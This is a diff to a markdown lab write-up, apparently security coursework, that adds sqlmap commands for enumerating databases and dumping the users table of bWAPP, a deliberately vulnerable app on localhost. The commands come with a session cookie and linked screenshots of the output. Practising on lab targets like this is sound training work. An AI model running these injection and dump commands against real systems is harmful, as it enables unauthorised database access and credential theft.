@@ -73,12 +73,24 @@ set *0xffffd728 = 0xffffd720
 git clone https://github.com/sqlmapproject/sqlmap.git
 ```
 Get database from bWapp
--u "http://localhost:8025/portal.php?id=1": This specifies the target URL where SQL injection can be tested. Make sure to modify the URL parameter if necessary.
+-u "http://localhost:8025/sqli_1.php?": This specifies the target URL where SQL injection can be tested. Make sure to modify the URL parameter if necessary.
 --dbs: This option tells sqlmap to enumerate the databases on the target server.
 ```sh
 python sqlmap.py -u "http://localhost:8025/sqli_1.php"  --cookie="PHPSESSID=kjn0r8jf0fackfpdbnvq8b8se6; security_level=0" --dbs --forms
 ```
 <img width="858" alt="{2EDB7DEE-0CB2-4193-827C-39139690C225}" src="https://github.com/user-attachments/assets/8b534ac0-955b-490c-87a3-9c882ec44f92">
+
+**Question 2**: Use sqlmap to get tables, users information
+**Answer 2**:
+- Take information from users in bWAPP then I have user and password
+
+```sh
+ python sqlmap.py -u "http://localhost:8025/sqli_1.php"  --cookie="PHPSESSID=kjn0r8jf0fackfpdbnvq8b8se6; security_level=0" --forms -D bWAPP -T users --dump
+```
+<img width="864" alt="{A82DBC29-4E9C-4CAC-B31E-CFA61466134C}" src="https://github.com/user-attachments/assets/838ab536-59ba-4353-bcbe-d63c69c76d2a">
+<img width="855" alt="{78EC48A3-6000-481A-9B51-E70BC4C3A9EC}" src="https://github.com/user-attachments/assets/bc3fed61-56cd-44eb-826e-2cc4dfdd7441">
+
+
 
 
 
